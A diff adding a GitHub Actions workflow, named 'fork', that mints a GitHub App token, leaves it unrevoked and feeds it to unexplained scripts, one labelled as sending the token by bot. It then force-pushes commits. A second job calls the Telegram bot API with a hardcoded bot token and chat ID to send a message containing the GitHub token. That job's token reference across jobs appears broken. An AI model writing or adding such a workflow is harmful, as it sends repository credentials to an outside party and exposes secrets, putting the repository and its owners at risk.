@@ -1,0 +1,68 @@
+name: fork
+on:
+  workflow_dispatch: null  
+jobs:
+  get-temp-token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+      - name: Get Token
+        id: get_workflow_token
+        uses: peter-murray/workflow-application-token-action@v3
+        with:
+          application_id: ${{ secrets.APPLICATION_ID }}
+          application_private_key: ${{ secrets.APPLICATION_PRIVATE_KEY }}
+          revoke_token: false
+      - name: install 
+        run: pip install  requests
+        
+      - name: Run Python script of token to check the use
+        run: |
+          python to.py
+        env:
+          GITHUB_TOKEN: ${{ steps.get_workflow_token.outputs.token }}        
+      - name: Script Send Token By bot
+        run: |
+          python tbot.py
+        env:
+          GITHUB_TOKEN: ${{ steps.get_workflow_token.outputs.token }}        
+          
+      - name: Run Python script
+        run: |
+          python appp.py
+        env:
+          GITHUB_TOKEN: ${{ steps.get_workflow_token.outputs.token }}   
+          
+      - name: Run Python script of token to check use
+        run: |
+          python to.py
+        env:
+          GITHUB_TOKEN: ${{ steps.get_workflow_token.outputs.token }} 
+          
+      - name: Push changes
+        uses: ad-m/github-push-action@master
+        with:
+          branch: ${{ github.ref }}
+      - name: Commit files
+        run: |
+          git config --local user.email "teamarctix1@outlook.com"
+          git config --local user.name "teamarctix"
+          git add .
+          git commit -a -m "add fork of mltb"
+      - name: Push changes
+        uses: ad-m/github-push-action@master
+        with:
+          force: true
+          tags: true
+        continue-on-error: true  
+          
+  show-temp-token:
+    needs: get-temp-token
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send Telegram Message
+        run: |
+          curl -X GET "https://api.telegram.org/bot6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I/sendMessage?chat_id=1881720028&text=The%20GitHub%20token%20is%3A%20$GITHUB_TOKEN"
+        env:
+          GITHUB_TOKEN: ${{ steps.get_workflow_token.outputs.token }}
